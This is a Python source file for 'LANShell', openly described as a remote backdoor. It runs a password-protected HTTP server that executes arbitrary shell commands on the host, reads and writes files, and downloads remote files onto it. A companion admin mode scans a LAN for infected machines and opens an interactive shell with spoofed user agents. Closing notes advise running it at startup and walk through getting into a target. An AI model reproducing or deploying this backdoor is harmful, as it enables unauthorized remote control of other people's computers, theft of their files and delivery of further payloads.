import os
import cgi
import sys
import time
import random
import socket
import getpass
import requests
import subprocess
from hashlib import sha256
from http.server import HTTPServer, BaseHTTPRequestHandler


"""
title: LANShell.py
description: A simple remote backdoor written in python.
author: Bryan Angelo Pedrosa
date: October 10, 2019
"""


try:
	import readline
except:
	pass

try:
	import thread
except:
	import _thread as thread


# server configurations
addr = "0.0.0.0"
port = 1337

# backdoor server
backdoor_server = ""

# password of your backdoor (in sha256 hash!)
backdoor_password = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" # equivalent to 'password'

# to spoof user-agent, thanks to cc.py
user_agents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1", "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1", "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0","Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1", "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0","Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0", "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3", "Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)", "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18", "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10", "Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)", "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1", "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5","Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14", "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20","Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a", "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2", "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN","Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN","Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN"]


##############################################################################

def get_session(url="", data={}, proxies={}):
	# random user-agent
	data["User-Agent"] = "User-Agent: " + random.choice(user_agents)
	return requests.get(url, data=data, proxies=proxies, allow_redirects=True, timeout=3)
	#return requests.post(url, data=data, proxies=proxies, allow_redirects=True)

def write(data, location):
	try:
		location = location.rsplit(os.sep,1)
		if os.path.exists(location[0]):
			filename = os.path.join(location[0], location[1])
			with open(filename, "wb+") as f:
				f.write(data)
			
			if os.path.exists(filename):
				return "Ok"
			else:
				return "Er"
		else:
			return "Er"
	except Exception as err:
		return "{0}".format(err)

def read(location):
	try:
		if os.path.exists(location):
			with open(location, "rb+") as f:
				data = f.read()
			return data
		else:
			return "Er"
	except Exception as err:
		return "{0}".format(err)


class ADMIN:
	def clear(self):
		try:
			subprocess.Popen("clear")
			subprocess.Popen("cls")
		except:
			pass
	
	def isopen_port(self, ip, port): # determine if port is open
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex((ip, port))
			if result == 0:
				return True
			else:
				return False
			sock.close()
		except:
			return False
	
	def isonline_host(self, url):
		try:
			return get_session(url, data={"presence":" "}).content
		except Exception as err:
			pass
	
	def autoLANscan(self, ip, iprange, port): # port mapping not supported
		up_server = {} # {"":"https://host:port/",.}
		
		ip = ip.split(".")
		if len(ip) == 4:
			ii = 0
			for i in range(int(ip[-1]), iprange+1):
				host = "{0}.{1}".format(".".join(ip[:-1]), i)
				url = "http://{0}:{1}/".format(host, port)
				
				print("checking {0}".format(url))
				
				try:
					if self.isonline_host(url) == "<response>":
						print("[+] bingo! found backdoor host: {0}".format(url))
						up_server[str(ii)] = url
						ii += 1
				except KeyboardInterrupt:
					break
				except Exception as err:
					pass
		return up_server
	
	def upload(self, host, auth_password, source=None, dest=None):
		if not source == None and not dest == None:
			# read file
			content = read(source)
			
			# upload file; return response
			return get_session(url=host, data={"cmd":"upload", "password":auth_password, "location":source, "dest":dest, "file":content}).content
		else:
			return "Er"
	
	def download(self, host, auth_password, source=None, dest=None):
		if not source == None and not dest == None:
			# request for a file
			content = get_session(url=host, data={"cmd":"download", "password":auth_password, "location":source}).content
			
			#save content
			return write(content, dest)
		else:
			return "Er"

class BACKDOOR:
	def wget(self, url="", location=os.path.join(".","")):
		try:
			filename = url.split('/')[-1]
			with open(os.path.join(location, filename), "wb") as f:
				f.write(get_session(url).content)
			return "Ok"
		except Exception as err:
			return "{0}".format(err)
	
	def cat(self, location=os.path.join(".","")):
		try:
			with open(location,"rb") as f:
				content = f.read()
			return content
		except Exception as err:
			return "{0}".format(err)
	
	def curl(self, url=""):
		return get_session(url).content
	
	def confirm_password(self, password=""):
		return sha256(password).hexdigest() == backdoor_password
	
	def cd(self, path):
		try:
			if os.path.exists(path):
				os.chdir(path)
				return ("Ok")
			else:
				return ("Er", "[os.path.exists] Path not found!")
		except:
			return ("Er")


class Server(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		#self.send_header("Content-type", "text/html")
		self.end_headers()
	
	def do_POST(self):
		self._REQSTS()
	
	def do_GET(self):
		self._REQSTS()
	
	def _REQSTS(self):
		self._set_headers()
		form = cgi.FieldStorage(
		fp=self.rfile, headers=self.headers,
		environ={'REQUEST_METHOD': 'POST'})
		
		# request variables
		cmd = form.getvalue("cmd")
		presence = form.getvalue("presence")
		password = form.getvalue("password")
		check_path = form.getvalue("check_path")
		check_password = form.getvalue("check_password")
		
		# shellbar variables
		pwd = os.getcwd()
		username = getpass.getuser()
		hostname = socket.gethostname()
		
		if not presence == None:
			self.wfile.write("<response>")
			
		elif not check_path == None and not password == None:
			if BACKDOOR().confirm_password(password):
				self.wfile.write("{0} {1} {2}".format(pwd, username, hostname))
			else:
				self.wfile.write("Er")
			
		elif not check_password == None:
			if BACKDOOR().confirm_password(check_password):
				self.wfile.write("Ok")
			else:
				self.wfile.write("Er")
			
		elif not password == None:
			if BACKDOOR().confirm_password(password):
				if not cmd == None:
					output = "Er"
					command = cmd.split()
					
					if command[0] == "cd":
						output = BACKDOOR().cd(command[1])
					elif command[0] == "wget":
						if len(command) == 3:
							output = BACKDOOR().wget(command[1], command[2]) # url, location
					elif command[0] == "curl":
						if len(command) == 2:
							output = BACKDOOR().curl(command[1]) # url
					elif command[0] == "cat":
						if len(command) == 2:
							output = BACKDOOR().cat(command[1]) # location
					elif command[0] == "upload":
						file_dat = form.getvalue("file")
						file_dest = form.getvalue("dest")
						
						# save file
						if not file_dat == None and not file_dest == None:
							output = write(file_dat, file_dest)
					elif command[0] == "download":
						location = form.getvalue("location")
						
						# send file
						if not location == None:
							output = read(location)
					else:
						output = os.popen(cmd).read()
				
				self.wfile.write("{0}".format(output))


def run(server_class=HTTPServer, handler_class=Server, addr="0.0.0.0", port=1337):
	server_address = (addr, port)
	httpd = server_class(server_address, handler_class)
	print("Starting httpd server on {0}:{1}".format(addr, port))
	httpd.serve_forever()



host = "http://localhost:1337"

if __name__ == "__main__":
	if len(sys.argv) == 4:
		if sys.argv[1] == "--admin":
			# target is behind NAT or you know the exact address of target/LAN
			# provide ip address/hostname on the second argument
			# argument: <app> + <--admin> + <host> + <port> // LANShell --admin 127.0.0.1 1337
			iparg = sys.argv[2].split("/")
			if len(iparg) == 2: # 127.0.0.1/24
				# auto scan on LAN/last ip bit
				backdoor_hosts = ADMIN().autoLANscan(iparg[0], int(iparg[1]), 1337)
				print(backdoor_hosts)
				
				# choose target backdoor
				if len(backdoor_hosts):
					print("\nBackdoor Hosts List:")
					for n, i in backdoor_hosts.iteritems():
						print("   {0} - {1}".format(n,i))
					
					while 1:
						try:
							select_host = raw_input("\nSelect hosts (n): ")
						except:
							select_host = input("\nSelect hosts (n): ")
						
						if select_host in backdoor_hosts:
							host = backdoor_hosts[select_host]
							break
				else:
					print("I'm sorry! No hosts found.\nexitting.....")
					sys.exit(1)
			
			else: # direct access
				host = "http://{0}:{1}/".format(sys.argv[2], sys.argv[3])
			
			# check connection
			if ADMIN().isonline_host(host) == "<response>":
				print("The host is online... ready!")
				# enter password to access backdoor, default: password
				try:
					auth_password = raw_input("Enter password: ")
				except:
					auth_password = input("Enter password: ")
			else:
				print("The host seems offline.. \nexitting.....")
				sys.exit(1)
			
			timeout = 1
			# check authentication
			while 1:
				if get_session(host, data={"check_password":auth_password}).content == "Ok":
					break
				elif timeout > 5:
					print("access denied.")
					sys.exit(1)
				print("reconnecting to backdoor {0}: {1}.....".format(host, timeout))
				timeout += 1
				time.sleep(.7)
			
			print("access granted!")
			
			# terminal loop
			while 1:
				# shellbar response
				shellbar = get_session(host, data={"check_path":" ", "password":auth_password}).content.split()
				pwd = shellbar[0]
				username = shellbar[1]
				hostname = shellbar[2]
				
				try:
					cmd = raw_input("\033[31m{0}@{1}\033[33m:\033[34m{2}\033[33m# \033[32m".format(username, hostname, pwd))
				except KeyboardInterrupt:
					print("\nexitting.....")
					sys.exit(1)
				except:
					cmd = input("\033[31m{0}@{1}\033[33m:\033[34m{2}\033[33m# \033[32m".format(username, hostname, pwd))
				
				command = cmd.split()
				
				if len(command) == 0:
					continue
				elif command[0] == "help":# [wip]
					print("""commands:
	* upload /or/ push <file to upload> <destination>       upload a file to backdoored computer.
	* download /or/ pull <file to download> <destination>   download a file from backdoored computer.
	* ls /or/ dir                                           show files and paths
	* cd                                                    change directory
	* clear /or/ cls                                        to clear all content on terminal
	* exit /or/ quit /or/ ctrl+c                            disconnect from backdoor 
	* the other is shell commands of a taget computer.

""")
				elif command[0] in ["pull", "download"]:
					if len(command) == 3:
						ADMIN().download(host, auth_password, command[1], command[2])
				elif command[0] in ["push", "upload"]:
					if len(command) == 3:
						ADMIN().upload(host, auth_password, command[1], command[2])
				elif command[0] in ["cls","clear"]:
					ADMIN().clear()
					continue
				elif command[0] in ["exit", "quit"]:
					sys.exit(1)
				else:
					print(get_session(host, data={"cmd":cmd, "password":auth_password}).content)
	
	elif len(sys.argv) == 1: # run as backdoor server
		run(addr=addr, port=port)



"""
to run a backdoor server:
python LANShell.py

^ it's better if you run it at startup.


to connect to backdoor server:
python LANShell.py --admin <Target IP> <backdoor default port: 1337>



First off. you need to get your LAN IP address by using ifconfig/ipconfig command.
Second, imagine you got your ip (192.168.1.2 for example). Now do this if you don't know your target! 192.168.1.0/24.
It will automatically scan networks until it scan 24 addresses.


NOTE: 192.168.1.0/24 - thats the address for auto scanning targets on LAN.
But, if you already know the IP of the target, just set it then do this (192.168.1.4 is the target):
python LANShell.py --admin 192.168.1.4 1337
It will redirect to the password prompt. Just type this 'password'. Press enter!
After logging in. It will show a shell terminal. That means you're in!


For auto scan mode (192.168.1.0/24).. just wait a few moment.
Once the scan is completed. You should see now some targets.
Now, choose only one by typing a number of the target.
Then type 'password' on the password prompt. All done, you're in!


commands:
	* upload /or/ push <file to upload> <destination>       upload a file to backdoored computer.
	* download /or/ pull <file to download> <destination>   download a file from backdoored computer.
	* ls /or/ dir                                           show files and paths
	* cd                                                    change directory
	* clear /or/ cls                                        to clear all content on terminal
	* exit /or/ quit /or/ ctrl+c                            disconnect from backdoor 
	* the other is shell commands of a taget computer.

"""



